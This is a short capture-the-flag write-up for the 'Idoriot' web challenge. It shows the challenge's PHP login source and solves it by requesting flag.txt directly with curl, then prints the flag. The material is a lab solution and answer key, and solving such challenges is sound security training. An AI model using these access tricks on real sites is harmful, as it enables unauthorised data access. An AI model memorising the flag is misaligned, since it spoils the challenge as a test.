# Idoriot

## Description

by `tirefire`

Some idiot made this web site that you can log in to. The idiot even made it in php. I dunno.

**Attachments**: [http://idoriot.chal.imaginaryctf.org/](http://idoriot.chal.imaginaryctf.org/)

## Solution

`Login` form doesn't seem injectable, so let's `Register`! 

Right away after registering we get source code.

```php
Welcome, User ID: 668712933
Source Code
<?php

session_start();

// Check if user is logged in
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

// Check if session is expired
if (time() > $_SESSION['expires']) {
    header("Location: logout.php");
    exit();
}

// Display user ID on landing page
echo "Welcome, User ID: " . urlencode($_SESSION['user_id']);

// Get the user for admin
$db = new PDO('sqlite:memory:');
$admin = $db->query('SELECT * FROM users WHERE user_id = 0 LIMIT 1')->fetch();

// Check if the user is admin
if ($admin['user_id'] === $_SESSION['user_id']) {
    // Read the flag from flag.txt
    $flag = file_get_contents('flag.txt');
    echo "<h1>Flag</h1>";
    echo "<p>$flag</p>";
} else {
    // Display the source code for this file
    echo "<h1>Source Code</h1>";
    highlight_file(__FILE__);
}

?>
```

We can't become admin, because admin exists. Can we just open `flag.txt`?

```bash
➜ curl http://idoriot.chal.imaginaryctf.org/flag.txt
ictf{1ns3cure_direct_object_reference_from_hidden_post_param_i_guess}
```
::: tip Flag
`ictf{1ns3cure_direct_object_reference_from_hidden_post_param_i_guess}`
:::